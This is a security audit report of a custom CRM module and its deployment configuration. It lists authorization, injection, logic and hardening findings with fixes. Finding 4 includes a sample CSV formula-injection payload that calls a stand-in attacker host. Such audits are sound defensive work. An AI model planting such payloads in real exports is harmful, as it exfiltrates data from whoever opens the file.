# ChusteRM Security Audit — Custom CRM Code + Deployment Config

## Executive Summary

The custom CRM module is **unusually well-engineered for a fork**: account scoping is enforced at three layers (controller lookups via `Current.account.*`, Pundit policies, and model-level `validates_same_account_for`), all SQL is parameterized or whitelisted, no `v-html` exists in the Vue layer, no secrets are hardcoded in custom code, and `.env` was never committed. The concurrency design (advisory locks, server-side positioning, idempotent backfill) is solid.

The real risk lives in **deployment configuration**, not application code:

| # | Severity | Finding |
|---|----------|---------|
| 1 | **HIGH** | Default `docker-compose.yml` ships hardcoded weak credentials + all-interface port bindings (Postgres/Redis/Evolution exposed) |
| 2 | **HIGH** | `ACTIVE_RECORD_ENCRYPTION_*` keys absent from every env template → Google OAuth tokens (and Evolution API key, webhook secrets) stored **plaintext**; MFA silently disabled |
| 3 | MEDIUM | CSV formula injection in the deals export emailed to admins |
| 4 | MEDIUM | `time_in_stage` metric permanently empty (audit action name mismatch) |
| 5 | MEDIUM | `stale_deals` metric false positives + N+1 |
| 6 | MEDIUM | nginx config drift: stale conf publicly exposes Evolution Manager/API; live conf blocks it |
| 7 | MEDIUM | No CSP, no edge rate limiting, `server_tokens` on |
| 8 | MEDIUM | Export download link is a permanent, unauthenticated Active Storage URL containing LGPD PII |
| 9 | LOW ×10 | Missing `authorize` on metrics/analyst, audit events readable by all agents, `custom_fields` score manipulation, `javascript:` href theoretical vector, OAuth code redeemed before state check, automation loop, unbounded activities index, audit logger swallowing failures, dead controller, error-key mismatch in UI |

---

## Scope 1 — Custom Rails CRM Module

### 1. Authorization & Multi-Tenancy (mostly strong — verified positives)

**What is done right (no action needed):**
- `Crm::BaseController` (base_controller.rb:6-8) denies unauthenticated/non-member access; every member-load goes through `Current.account.<association>.find(...)` — all 21 controllers checked, no unscoped `Model.find(params[:id])`. No IDOR found.
- Cross-tenant writes blocked twice: `resolve_account_scoped_ids!` (base_controller.rb:31-39) re-resolves client-supplied IDs through account associations, and `AccountAssociationScoped.validates_same_account_for` re-validates at the model layer.
- `Crm::DealMover#target_stage` (deal_mover.rb:127-136) validates stage ∈ deal's pipeline; `Crm::DealPositioner#find_neighbour` (deal_positioner.rb:141-154) rejects neighbours from other stages/accounts.
- Admin-only actions correctly gated: pipeline/stage/cadence/automation-rule/checklist/loss-reason writes, deal `destroy?`, `export?` (crm_deal_policy.rb:18-20, 38-40).
- `BoardViewsController#editable_view` (board_views_controller.rb:47-51) returns 404 instead of 403 for others' views — deliberate and correct.

**FINDING 1 — LOW — Metrics endpoints lack `authorize`**
`core/app/controllers/api/v1/accounts/crm/metrics_controller.rb:4-60` — none of the 9 actions calls `authorize`. Today this equals `CrmDealPolicy#index?` (`true` for any account user), so there is no current bypass, but if deal visibility is ever restricted (teams/roles), metrics will silently leak aggregates. **Fix:** add `authorize CrmDeal, :index?` to each action (or a `before_action`).

**FINDING 2 — LOW — `AnalystController#create` lacks `authorize`**
`analyst_controller.rb:2-8` — any agent can run account-wide aggregate queries. Same reasoning as above. **Fix:** `authorize CrmDeal, :index?`.

**FINDING 3 — LOW — Audit events readable by every agent**
`crm_audit_event_policy.rb:2-4` (`account_user.present?`) + `audit_events_controller.rb:17-30`. Audit payloads contain before/after diffs including LGPD consent fields (`deals_controller.rb:848-859`) and full change history of every deal. For a law-firm CRM, the audit trail should be admin-only. **Fix:** `administrator?` in the policy.

### 2. Injection (SQL: clean; CSV: one finding)

**Verified clean:** `INDEX_ORDERS` whitelist (deals_controller.rb:267-274); `Arel.sql` only wraps constants; `BoardGrouping#key_sql` interpolates only whitelisted `group_by` values and constants (board_grouping.rb:41, 52-61); search uses `sanitize_sql_like` + bind params (deal_filter_service.rb:193-217, activities_controller.rb:300-343); advisory-lock keys sanitized (stage_advisory_lock.rb:22-35). **No SQL injection found.**

**FINDING 4 — MEDIUM — CSV formula injection in deals export**
`core/app/jobs/crm/deals_export_job.rb:46-83`:
```ruby
def csv_value(text)
  return '' if text.blank?
  text.to_s.gsub(/[\r\n]+/, ' ').strip
end
```
`csv_value` strips newlines but does not neutralize leading `=`, `+`, `-`, `@`. `deal.title`, `deal.summary`, `deal.next_best_action` are wrapped, but `legal_area`, `case_type`, `crm_loss_reason&.name` go in raw — all agent/API-controllable. A title like `=HYPERLINK("https://evil.tld/x","open")` executes when the admin opens the emailed CSV in Excel/LibreOffice (data exfiltration; DDE on old Excel). **Fix:** prefix any cell starting with `= + - @ \t` with a single quote, e.g. `text.sub(/\A(?=[=+\-@\t])/, "'")`, applied to *all* string cells.

### 3. Mass Assignment

Strong params are correctly scoped everywhere (`params.require(...).permit(...)` or bare `permit` for flat payloads). One residual:

**FINDING 5 — LOW — Arbitrary `custom_fields` JSON can steer scoring**
`deals_controller.rb:404, 415` accepts `custom_fields: {}` / `attribution: {}` wholesale. `LeadScoreCalculator#captain_triage` (lead_score_calculator.rb:283-285) reads `custom_fields['captain_triage']` for `economic_potential`, `engagement_level`, `payment_capacity`, and `data_quality` — an agent can PATCH these to inflate scores or force `data_quality: 'insufficient'` to suppress auto-move/escalation, bypassing the analyzer-only provenance. **Fix:** strip reserved keys (`captain_triage`) from permitted params; merge them only from `LegalTriageAnalyzer`/`TriageFromConversation`.

### 4. XSS (Vue)

**Verified clean:** zero `v-html`/`innerHTML`/`eval` across all 30 CRM components; all URLs in `agenda_events_controller.rb:295-309` are server-built paths.

**FINDING 6 — LOW — Unvalidated scheme on attachment URLs**
`CRMKanbanChatDrawer.vue:508-517` — `attachmentUrl()` returns `attachment.external_url` (channel/provider-supplied, surfaced via `serialize_attachment`, deals_controller.rb:619-634) bound to `:href` (lines 1348, 1377) and `<img :src>` / `<audio :src>`. Vue does not sanitize `javascript:` URLs in `:href`; a provider-poisoned `external_url` would execute script in the app origin on click. **Fix:** allowlist `^https?://` and app-relative paths in `attachmentUrl()`.

### 5. CSRF / Session / OAuth

API endpoints inherit Chatwoot's token auth — no deviation found. OAuth state is a `message_verifier` payload with a 15-minute SGID expiry and prefix-validated `return_to` (google_authorizations_controller.rb:73-101) — good.

**FINDING 7 — LOW — Authorization code redeemed before state verification**
`core/app/controllers/crm/google_callbacks_controller.rb:8-12` calls `get_token(params[:code])` *before* `store_connection!` (which is where `state_payload` is first verified, lines 73-82). An invalid/forged state still burns the one-time code (DoS against a legit in-flight flow) before rejection. Also line 65 decodes `id_token` with `verify=false` — tolerable since it arrives inside the TLS server-to-server token response, but worth a comment. **Fix:** verify `params[:state]` first, then exchange the code.

### 6. Logic Bugs

**FINDING 8 — MEDIUM — `time_in_stage` metric permanently empty**
`metrics_service.rb:52` filters audit events by `action: 'deal_moved_to_stage'`, but `DealMover#log_stage_change` (deal_mover.rb:60-67) writes `action: 'deal_stage_changed'`. The metric always returns zeros. **Fix:** change the queried action to `deal_stage_changed` (and confirm payload key `to_stage_id`, which matches).

**FINDING 9 — MEDIUM — `stale_deals` false positives + N+1**
`metrics_service.rb:171-192`: `.joins(:crm_activities).where('crm_activities.created_at < ?', cutoff)` matches any deal with *one* old activity — a deal with an activity yesterday and one last month is wrongly "stale". Then `deal.crm_activities.order(created_at: :desc).first` runs per deal (N+1). **Fix:** `GROUP BY crm_deal_id HAVING MAX(created_at) < cutoff` (or `where.missing` anti-join against recent activities) and aggregate `MAX` in one query.

**FINDING 10 — LOW — Stage automation `move_to_stage` has no cycle guard**
`stage_automation.rb:114-123` — rule on stage A moving to B plus rule on B moving to A recurses `DealMover → StageAutomation → DealMover …` until stack/DB exhaustion. Admin-config-only, but a plausible misconfiguration. **Fix:** carry a visited-stage set / depth cap through `DealMover`.

**FINDING 11 — LOW — In-memory average over all closed deals**
`metrics_service.rb:215-221` (`calc_avg_time_to_close`) loads every closed deal to sum in Ruby. **Fix:** SQL `AVG(EXTRACT(EPOCH FROM closed_at - created_at))`.

**FINDING 12 — LOW — Unbounded activities index**
`activities_controller.rb:236-251` — without a `limit` param the endpoint returns the account's entire activity table with includes. **Fix:** default cap (e.g. 200) like the `limit` branch already enforces.

**FINDING 13 — LOW — Audit trail silently incomplete**
`audit_logger.rb:16-18` rescues *all* errors to a log line — a failing audit write (e.g. payload too large) leaves no trace and no signal. Also `ip`/`user_agent` are serialized (audit_events_controller.rb:26-27) but never populated by the logger. **Fix:** pass request context into `AuditLogger.log` where available; emit a metric/alert on failure.

**INFO — dead code:** `TriageController#from_conversation` (triage_controller.rb) has no route (routes.rb:220 maps to `Triage::FromConversationController#create`). Remove to reduce surface.

**Stage-transition integrity (verified good):** purge refuses when deals exist (pipelines_controller.rb:57-64, pipeline_stages_controller.rb:73-80); `has_many :crm_deals, dependent: :restrict_with_error` on pipeline/stage; `stage_belongs_to_pipeline` validation; `mark_won!/mark_lost!/reopen!` keep cards in-column by design (documented in deals_controller.rb:311-315); win/loss reasons resolved account-scoped (deals_controller.rb:139). Transactions wrap multi-writes (`DealCreator`, `TriageFromConversation`, cadence step sync, positioner rebalance). N+1 is deliberately engineered away (`DEAL_INCLUDES` + 4 aggregate maps, deals_controller.rb:283-307).

### 7. UI/UX (Vue)

- Error handling: async flows use try/catch with user-facing fallbacks (e.g. CrmIndexOperational.vue:438-446). **LOW inconsistency:** the catch reads `exception?.response?.data?.message` but the Rails API renders `{ error: ... }` — users always see the generic fallback. Read `.error` first.
- Validation: `CRMCreateDealDrawer.vue:35` guards submit on non-empty title; server enforces presence anyway. Acceptable.
- Tests: 24 frontend spec files (~4,350 lines) + backend request specs for deals/board/activities/agenda/pipelines/board_views/triage. Not executed (read-only audit).

---

## Scope 2 — Deployment & Secrets

**FINDING 14 — HIGH — Hardcoded weak credentials + all-interface bindings in the default compose**
`docker-compose.yml`:
```yaml
14:  POSTGRES_PASSWORD: chusterm_pass
32:  command: redis-server --requirepass chusterm_redis_pass ...
113: - AUTHENTICATION_API_KEY=${EVOLUTION_API_KEY:-evo_chusterm_secret_key}
17-18: ports: "5436:5432"        # Postgres → 0.0.0.0
33-34: ports: "6382:6379"        # Redis → 0.0.0.0
126-127: ports: "8085:8080"      # Evolution API → 0.0.0.0
```
Compose binds to `0.0.0.0` by default, and the sidekiq service here runs `RAILS_ENV=production` (line 219). If this file (or `docker-compose.dev.yml`, which mirrors the creds) is ever started on a reachable host, Postgres/Redis/Evolution are internet-accessible with credentials committed to git. The Evolution default key also appears in `.env.example:90`. **Fix:** bind dev ports to `127.0.0.1` (`"127.0.0.1:5436:5432"`), remove password defaults (`${POSTGRES_PASSWORD:?required}`), rotate any credential that was ever used beyond localhost.

**FINDING 15 — HIGH — Encryption keys missing from all deployment templates → plaintext tokens at rest**
`crm_external_connection.rb:8-12` encrypts Google `access_token`/`refresh_token` **only if** `ChusteRM.encryption_configured?` (application.rb:109-117), which requires three `ACTIVE_RECORD_ENCRYPTION_*` env vars. Verified: these vars appear in **neither** `.env.example`, **nor** `.env.prod.example`, **nor** `docker-compose.prod.yml`. `deploy.sh:32-39` instructs building `.env` from `.env.prod.example`, so a template-following production deploy stores Google OAuth refresh tokens, the Evolution global API key (`evolution_api_configuration.rb:7`), webhook secrets, and channel tokens in **plaintext**, and silently disables MFA (`mfa_enabled?` is the same guard). **Fix:** add the three keys (generation instructions: `openssl rand -hex 32` / `bin/rails db:encryption:init`) to `.env.prod.example` and the deploy checklist; verify the live VPS `.env` today.

**FINDING 16 — MEDIUM — nginx config drift exposes Evolution Manager/API**
Two divergent server blocks for `crm.coimbraeruas.com.br` exist:
- `infra/nginx/chusterm.conf` (May): proxies `/manager` → Evolution (lines 71-82) and leaves Evolution's admin API reachable through `location /`.
- `chusterm-host.conf` (Aug, apparently live): returns 404 for `/manager*` and `allow 127.0.0.1; deny all;` on Evolution admin paths (lines 100-133) — the hardened intent.

Deploying the stale conf (both are in the repo with install instructions) re-exposes the Evolution Manager and admin API publicly. The stale conf has a second defect: the nested static-assets location (lines 112-116) declares its own `add_header`, which under nginx inheritance **drops** the server-level HSTS/X-Frame-Options/nosniff for extension-matched responses — including Active Storage blob URLs ending in `.svg`, a stored-XSS-via-SVG-upload vector. **Fix:** delete or replace `infra/nginx/chusterm.conf` with the host conf; keep one source of truth.

**FINDING 17 — MEDIUM — Missing edge hardening on the live conf**
`chusterm-host.conf`: no `Content-Security-Policy`, no `limit_req` rate limiting (login, `/api`, webhooks are edge-unthrottled), no `server_tokens off`. HSTS/X-Frame-Options/nosniff are present (good). **Fix:** add a report-only CSP tuned to the SPA, `limit_req_zone` for `/api/` and auth endpoints, `server_tokens off;`.

**FINDING 18 — MEDIUM — Permanent unauthenticated export URL with LGPD PII**
`deals_export_job.rb:28-32` emails `rails_blob_url(@account.crm_deals_export)`. Active Storage signed blob IDs do not expire by default — the link (containing titles, summaries, LGPD consent fields, contact IDs for the whole filtered deal set) works forever for anyone who obtains it (forwarded mail, mail logs, proxy logs). **Fix:** serve exports through an authenticated, admin-authorized download endpoint, or set a short `expires_in` on a service URL and rotate per export.

**FINDING 19 — LOW — Container hardening gaps (prod)**
`docker-compose.prod.yml`: no `user:` (processes run as root in-container), no `read_only:`/`cap_drop`. Positives present: 127.0.0.1-only bindings, isolated `chusterm_network`, healthchecks, `unless-stopped`, json-file log rotation, secrets exclusively via env vars, `AUTHENTICATION_EXPOSE_IN_FETCH_INSTANCES=false`.

**FINDING 20 — LOW — `proxy_ssl_verify off`** (`chusterm-host.conf:49`) — loopback-only, acceptable; note if the backend ever moves off-loopback.

**Secrets hygiene (verified good):** `git ls-files` shows only `*.env.example` files tracked; `.env` is gitignored (line 2) and has no commit history; `.dockerignore` excludes `.env*`; `.env.prod.example` uses `PREENCHER_*` placeholders; targeted greps for `sk-`, `Bearer`, `api_key`, `secret`, `password` across the custom controllers, services, and Vue components returned **zero** hits; `setup_*.sh` is gitignored (setup_julia_ia.sh is untracked); `deploy.sh` contains no credentials and runs migrations as a one-shot before `up`.

---

## Recommended Remediation Order

1. **Today:** verify `ACTIVE_RECORD_ENCRYPTION_*` on the VPS (F15); confirm which nginx conf is live (F16); rotate Postgres/Redis/Evolution credentials if the dev compose ever ran on the VPS (F14).
2. **This week:** fix compose dev bindings/credential defaults (F14); add encryption keys to prod template (F15); purge stale nginx conf (F16); fix `time_in_stage` action name (F8); neutralize CSV formula chars (F4).
3. **Next sprint:** expiring export URLs (F18); CSP + rate limiting (F17); `stale_deals` query rewrite (F9); `authorize` on metrics/analyst (F1/F2); admin-only audit events (F3); `captain_triage` key filtering (F5); attachment URL scheme allowlist (F6); OAuth state-first ordering (F7).

**Not verified (out of reach of a read-only repo audit):** the actual VPS `.env` contents, which nginx conf is deployed, whether the live DB columns are encrypted, and test-suite pass status.
